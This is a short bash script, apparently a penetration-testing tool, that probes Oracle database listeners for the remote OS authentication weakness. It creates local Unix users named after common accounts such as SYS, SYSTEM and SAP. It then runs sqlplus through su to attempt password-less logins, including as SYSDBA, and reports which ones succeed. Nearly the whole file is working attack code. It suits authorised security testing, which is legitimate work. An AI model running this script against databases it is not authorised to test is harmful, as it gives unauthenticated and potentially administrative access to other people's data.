#!/usr/bin/env bash
# Simple script to test for Remote OS Authentication on Oracle Database
# Released under Creative Commons license : http://creativecommons.org/licenses/by-nc-sa/4.0/
# Warning : Released "as is" and contains unpatched bugs, consider yourself warned :-)

# Requires sqlplus + oracle libs

if [[ $EUID -ne 0 ]]; then
   echo "This script must run as root" 1>&2
   exit 1
fi

echo "About to start"

COLOR_RED='\e[0;31m'
COLOR_GREEN='\e[0;32m'
COLOR_NC='\e[0m'

# Variables here describe hosts, SID and listener ports to test, comma-separated
ALL_LOGINS=SAP
LISTENERS=192.168.1.1:1525/SID
TEST_DEFAULTS=0 # Set this to 1 if you want to test common logins (ORACLE, SYS, TEST, SAP, etc.)

# Set your path to Oracle libs and tools here
ORA_PATH=/opt/oracle/instantclient_10_2

# Commonly found logins to test
if [ $TEST_DEFAULTS -gt 0 ]; then 
ALL_LOGINS=ORACLE,SYS,SYSTEM,SAP,TEST,ADMIN,PATROL,$LOGINS
fi

echo "Starting..."

for login in `echo $ALL_LOGINS|sed 's/,/\n/g'`
do
echo "Trying Oracle OS authentication with user : $login"
/usr/sbin/useradd -M $login
for listener in `echo $LISTENERS|sed 's/,/\n/g'`
do
echo -n "... on Oracle host:port/SID : $listener ... "
/bin/su $login -c "\
export PATH=$PATH:$ORA_PATH;\
export SQLPATH=$ORA_PATH;\
export TNS_ADMIN=$ORA_PATH;\
export LD_LIBRARY_PATH=$ORA_PATH:$LD_LIBRARY_PATH;\
export ORACLE_HOME=ORA_PATH;\
echo 'SELECT 4278537865342 FROM DUAL;' | $ORA_PATH/sqlplus /@$listener | grep 4278537865342 > /dev/null 2>&1 && echo -e '${COLOR_GREEN}OK${COLOR_NC}' || echo -e '${COLOR_RED}KO${COLOR_NC}'\
"
echo -n "... on Oracle host:port/SID as SYSDBA : $listener ... "

/bin/su $login -c "\
export PATH=$PATH:$ORA_PATH;\
export SQLPATH=$ORA_PATH;\
export TNS_ADMIN=$ORA_PATH;\
export LD_LIBRARY_PATH=$ORA_PATH:$LD_LIBRARY_PATH;\
export ORACLE_HOME=ORA_PATH;\
echo 'SELECT 4278537865342 FROM DUAL;' | $ORA_PATH/sqlplus /@$listener as SYSDBA | grep 4278537865342 > /dev/null 2>&1 && echo -e '${COLOR_GREEN}OK${COLOR_NC}' || echo -e '${COLOR_RED}KO${COLOR_NC}'\
"
done
/usr/sbin/userdel $login
done
exit
